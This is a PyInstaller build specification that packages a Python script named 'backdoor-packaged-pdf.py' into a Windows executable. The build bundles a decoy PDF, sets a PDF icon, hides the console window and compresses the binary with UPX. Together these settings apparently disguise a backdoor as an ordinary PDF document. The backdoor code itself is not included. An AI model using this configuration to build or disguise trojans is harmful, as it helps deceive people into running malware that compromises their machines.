# -*- mode: python ; coding: utf-8 -*-

block_cipher = None


a = Analysis(['backdoor-packaged-pdf.py'],
             pathex=['Z:\\root\\PycharmProjects\\myproject\\Backdoor'],
             binaries=[],
             datas=[('/root/Downloads/half.pdf', '.')],
             hiddenimports=[],
             hookspath=[],
             runtime_hooks=[],
             excludes=[],
             win_no_prefer_redirects=False,
             win_private_assemblies=False,
             cipher=block_cipher,
             noarchive=False)
pyz = PYZ(a.pure, a.zipped_data,
             cipher=block_cipher)
exe = EXE(pyz,
          a.scripts,
          a.binaries,
          a.zipfiles,
          a.datas,
          [],
          name='backdoor-packaged-pdf',
          debug=False,
          bootloader_ignore_signals=False,
          strip=False,
          upx=True,
          upx_exclude=[],
          runtime_tmpdir=None,
          console=False , icon='\\root\\Downloads\\pdf.ico')
